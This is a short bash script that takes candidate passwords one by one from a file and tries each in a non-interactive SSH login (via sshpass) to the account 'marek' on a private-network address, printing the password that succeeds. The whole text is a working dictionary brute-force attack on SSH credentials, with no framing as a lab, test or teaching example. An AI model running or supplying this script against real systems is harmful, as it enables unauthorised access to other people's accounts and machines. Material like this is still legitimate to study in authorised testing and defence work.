for password in $(cat passwords.txt)
do
   sshpass -p $password ssh marek@192.168.1.100 exit 2> /dev/null
   if [ $? -eq 0 ]
   then
        echo "The right password is: $password"
    exit 0
   else
        echo "$password is wrong password"
 fi
done
